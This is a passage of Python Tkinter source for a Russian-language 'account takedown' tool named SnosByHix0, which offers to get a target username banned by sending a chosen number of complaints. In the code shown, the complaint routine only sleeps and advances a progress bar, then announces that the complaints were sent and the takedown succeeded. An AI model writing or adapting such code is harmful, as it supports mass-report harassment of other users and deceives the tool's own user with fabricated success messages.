                font=('Arial', 12), fg='#e6e6ff', bg='#1a1a2e').pack(anchor='w')
        
        complaints_scale = tk.Scale(input_frame, from_=1, to=50, orient='horizontal',
                                  bg='#1a1a2e', fg='#e6e6ff', 
                                  highlightbackground='#1a1a2e',
                                  troughcolor='#4a4a9c')
        complaints_scale.set(20)
        complaints_scale.pack(pady=10, fill='x')
        
        progress_frame = ttk.Frame(ban_window)
        progress_frame.pack(pady=20, padx=20, fill='x')
        
        self.progress_var = tk.DoubleVar()
        progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, 
                                      maximum=100, length=400)
        progress_bar.pack(fill='x')
        
        self.status_label = tk.Label(progress_frame, text="Готов к работе", 
                                    font=('Arial', 10), fg='#e6e6ff', bg='#1a1a2e')
        self.status_label.pack(pady=5)
        
        button_frame = ttk.Frame(ban_window)
        button_frame.pack(pady=20)
        
        start_btn = tk.Button(button_frame, text="🚀 Начать снос", 
                            font=('Arial', 12, 'bold'),
                            bg='#8a2be2', fg='white',
                            borderwidth=0, padx=20, pady=10,
                            command=lambda: self.start_ban_process(
                                username_entry.get(), 
                                complaint_var.get(),
                                complaints_scale.get(),
                                ban_window
                            ))
        start_btn.pack(side='left', padx=10)
        
        cancel_btn = tk.Button(button_frame, text="Отмена", 
                             font=('Arial', 12),
                             bg='#4a4a9c', fg='white',
                             borderwidth=0, padx=15, pady=8,
                             command=ban_window.destroy)
        cancel_btn.pack(side='left', padx=10)
    
    def start_ban_process(self, username, complaint_type, num_complaints, window):
        if not username:
            messagebox.showwarning("Ошибка", "Введите username или ID аккаунта!")
            return
        
        thread = threading.Thread(target=self.ban_process, 
                                 args=(username, complaint_type, num_complaints, window))
        thread.daemon = True
        thread.start()
    
    def ban_process(self, username, complaint_type, num_complaints, window):
        try:
            for i in range(num_complaints):
                progress = (i + 1) / num_complaints * 100
                self.progress_var.set(progress)
                
                status_text = f"Отправка жалобы {i+1}/{num_complaints}... "
                self.status_label.config(text=status_text)
                
                time.sleep(self.complaint_speed)
                
                if hasattr(self, 'root'):
                    self.root.update()
            
            self.status_label.config(text="✅ Снос аккаунта завершен!")
            messagebox.showinfo("Успех", 
                              f"Аккаунт {username} успешно обработан!\n"
                              f"Отправлено жалоб: {num_complaints}\n"
                              f"Причина: {complaint_type}")
            
        except Exception as e:
            self.status_label.config(text="❌ Ошибка при выполнении!")
            messagebox.showerror("Ошибка", f"Произошла ошибка: {str(e)}")
    
    def exit_app(self):
        if messagebox.askokcancel("Выход", "Вы уверены, что хотите выйти?"):
            self.root.destroy()
            sys.exit()

def main():
    root = tk.Tk()
    app = SnosByHix0(root)
    root.mainloop()

if __name__ == "__main__":
    main()
